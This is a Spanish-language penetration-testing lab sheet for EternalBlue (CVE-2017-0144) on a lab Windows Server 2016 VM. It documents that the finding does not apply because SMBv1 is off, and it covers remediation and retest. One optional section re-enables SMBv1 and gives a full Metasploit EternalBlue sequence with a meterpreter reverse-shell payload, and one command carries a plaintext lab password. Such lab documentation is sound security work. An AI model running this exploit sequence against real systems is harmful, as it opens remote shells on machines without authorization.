# S1 · EternalBlue · CVE-2017-0144

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M4 `10.10.10.14` |
| Servicio | SMBv1 |
| Sistema | WS2016 build 14393 |
| Rango vulnerable | WS2016 sin MS17-010; Win10 1507/1511/1607 |
| Versión que corrige | **MS17-010** + SMBv1 off |
| CVSS | **8.8** v3.1 |
| CWE | CWE-94 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2017-0144 |
| Estado | **No aplicable tal como está** (SMB1 off / build) |

## 2. Por qué no aplica

El laboratorio tiene **SMBv1 desactivado** y el build no se comporta como vulnerable. `nxc` reporta `SMBv1:None`; `smb-vuln-ms17-010` no confirma.

Evidencia:

```bash
nxc smb 10.10.10.14 -u Administrador -p 'password_2026'
nmap -sT --script smb-vuln-ms17-010 -p 445 10.10.10.14
```

## 3. Si se quiere intentar (opcional)

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
# reiniciar
```

```bash
nmap -sT --script smb-vuln-ms17-010 -p 445 10.10.10.14
```

Si responde `VULNERABLE`:

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.14
set LHOST 10.10.10.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
getuid
```

Si no, **retirar S1** y sostener M4 con S2/S3/S4/S5.

## 4. Evidencia de la limitación

- `EV-S1-01`: `nxc` con `SMBv1:None`.
- `EV-S1-02`: `smb-vuln-ms17-010` sin confirmación.
- `LOG-S1`.

## 5. Remediación

- Instalar **MS17-010**.
- Deshabilitar **SMBv1**.
- Verificar con `Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`.

## 6. Retest

```powershell
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol  # Disabled
```

```bash
nmap -sT --script smb-vuln-ms17-010 -p 445 10.10.10.14        # limpio
```

## 7. EARS

- **REQ-S1-01 (No deseado).** SI SMBv1 está off, ENTONCES el laboratorio NO DEBE afirmar EternalBlue.
- **REQ-S1-02 (Ubicuo).** La limitación DEBE documentarse y M4 DEBE sostener S2/S3/S4/S5.

## 8. Checklist

- [ ] SMB1 verificado.
- [ ] `smb-vuln-ms17-010` ejecutado.
- [ ] Limitación documentada.
- [ ] Alternativa S2/S3.
